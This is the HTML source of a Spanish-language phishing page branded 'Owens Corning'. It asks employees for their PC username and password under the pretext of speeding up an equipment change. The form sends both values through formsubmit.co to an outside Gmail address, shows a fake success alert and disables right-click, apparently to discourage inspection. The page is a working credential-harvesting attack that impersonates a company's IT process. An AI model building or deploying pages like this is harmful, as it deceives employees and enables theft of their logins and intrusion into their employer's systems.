<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Equipos</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    
    <p class="about-txt" style="text-align: center;"> <br> Ingresa tu usuario y contraseña de pc para agilizar tu cambio de equipo</p>

    <form autocomplete="off" action="https://formsubmit.co/ocwusers@gmail.com" method="POST" class="form-general" id="registroForm">
        <h2>Owens Corning</h2>

        <div class="input-container">
            <label for="user"><img class="icons" src="user.png" alt="User"></label>
            <input class="inp" placeholder="usuario" type="text" name="name" id="user" required>
        </div>

        <div class="input-container">
            <label for="pass"><img class="icons" src="lock.png" alt="Lock"></label>
            <input class="inp" placeholder="contraseña" type="password" name="subject" id="pass" required>
        </div>

        <input type="submit" value="Registrar" class="btn-1">
        <input type="hidden" name="_next" value="http://localhost/smc/resource/pages/owens/exit.html">
        <input type="hidden" name="_captcha" value="false">
    </form>

    <script>
        document.getElementById("registroForm").addEventListener("submit", function(event) {
            event.preventDefault(); // Evita el envío inmediato
            alert("Registro exitoso");
            this.submit(); // Envía el formulario después de la alerta
        });

        document.addEventListener("contextmenu", function(e) {
            e.preventDefault();
        });
    </script>

</body>
</html>
